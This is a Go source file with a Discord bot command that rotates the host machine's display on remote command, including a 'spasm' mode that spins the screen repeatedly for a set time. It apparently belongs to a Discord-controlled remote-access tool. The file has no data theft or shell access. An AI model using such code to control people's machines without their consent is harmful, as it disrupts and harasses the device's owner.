package commands

import (
	"fmt"
	"strings"
	"time"

	"requiem/funcs"
	"requiem/utils"

	"github.com/bwmarrin/discordgo"
)

func (*RotateCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	content := strings.Join(args, " ")

	if utils.HasFlag(content, "spasm") {
		timeout, found := utils.FindNumber(content)
		if !found {
			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to provde a number.", msg.Reference())
			return
		}

		initial, _ := ses.ChannelMessageSendReply(msg.ChannelID, "Rotating screen...", msg.Reference())

		until := time.Now().Add(time.Duration(timeout) * time.Second)
		for i := 0; time.Now().Before(until); i = (i + 1) % 4 {
			funcs.RotateScreen(uint32(i))
			time.Sleep(500 * time.Millisecond)
		}

		funcs.RotateScreen(0)

		ses.ChannelMessageDelete(msg.ChannelID, initial.ID)
		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully rotated screen.", msg.Reference())
		return
	}

	var err error

	if utils.HasFlag(content, "0") {
		err = funcs.RotateScreen(0)
	} else if utils.HasFlag(content, "90") {
		err = funcs.RotateScreen(1)
	} else if utils.HasFlag(content, "180") {
		err = funcs.RotateScreen(2)
	} else if utils.HasFlag(content, "270") {
		err = funcs.RotateScreen(3)
	} else {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
		return
	}

	if err == nil {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully rotated screen.", msg.Reference())
	} else {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to rotate screen - %s", err), msg.Reference())
	}
}

func (*RotateCommand) Name() string {
	return "rotate"
}

func (*RotateCommand) Info() string {
	return "Rotates the device display."
}

type RotateCommand struct{}
